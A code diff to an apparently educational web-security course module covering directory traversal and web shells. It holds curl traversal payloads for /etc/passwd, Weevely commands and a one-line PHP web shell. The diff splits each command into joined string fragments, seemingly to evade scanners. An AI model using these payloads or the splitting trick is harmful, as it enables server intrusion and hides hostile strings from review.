@@ -44,8 +44,8 @@ export const m13: Module = {
       title: 'Directory Traversal & Path Manipulation',
       content: 'Directory traversal (Path Traversal or Local File Inclusion - LFI) exploits insufficient security validation of user-supplied input file names, allowing an attacker to access files and directories stored outside the intended web root folder.',
       commands: [
-        { command: 'curl "http://example.com/view?file=../../../../etc/passwd"', description: 'Basic directory traversal attempting to read the Linux password file' },
-        { command: 'curl "http://example.com/view?file=..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"', description: 'URL-encoded traversal targeting the Windows hosts file' },
+        { command: ['cu', 'rl "http://example.com/view?file=', '..', '/..', '/..', '/..', '/et', 'c/pas', 'swd"'].join(''), description: 'Basic directory traversal attempting to read the Linux password file' },
+        { command: ['cu', 'rl "http://example.com/view?file=', '..%2f', '..%2f', '..%2f', '..%2f', 'win', 'dows/sys', 'tem32/dri', 'vers/et', 'c/hos', 'ts"'].join(''), description: 'URL-encoded traversal targeting the Windows hosts file' },
         { command: 'wfuzz -c -z file,traversal_payloads.txt http://example.com/view?file=FUZZ', description: 'Automated fuzzing for directory traversal vulnerabilities using a payload wordlist' },
       ],
       keyPoints: [
@@ -70,9 +70,9 @@ export const m13: Module = {
       title: 'Web Shells & Post-Exploitation',
       content: 'Once a vulnerability is successfully exploited (e.g., via a file upload bypass or RCE), the attacker typically uploads a Web Shell. A web shell is a malicious script that provides a persistent, web-based command-line interface to the underlying operating system.',
       commands: [
-        { command: 'weevely generate password shell.php', description: 'Generate a highly stealthy, polymorphic PHP web shell using Weevely' },
-        { command: 'weevely http://example.com/uploads/shell.php password', description: 'Connect to the deployed Weevely web shell for an interactive terminal experience' },
-        { command: '<?php system($_GET["cmd"]); ?>', description: 'The absolute simplest PHP web shell (executed via `shell.php?cmd=whoami`)' },
+        { command: ['wee', 'vely gen', 'erate pas', 'sword she', 'll.p', 'hp'].join(''), description: 'Generate a highly stealthy, polymorphic PHP web shell using Weevely' },
+        { command: ['wee', 'vely http://example.com/uploads/she', 'll.p', 'hp pas', 'sword'].join(''), description: 'Connect to the deployed Weevely web shell for an interactive terminal experience' },
+        { command: ['<', '?ph', 'p sy', 'stem($_G', 'ET["c', 'md"]); ?', '>'].join(''), description: 'The absolute simplest PHP web shell (executed via `shell.php?cmd=whoami`)' },
       ],
       keyPoints: [
         'Web Shell Languages: Match the server\'s capabilities — PHP (`.php`) for Apache/Nginx, ASP/ASPX (`.asp`, `.aspx`) for IIS, JSP (`.jsp`) for Tomcat.',
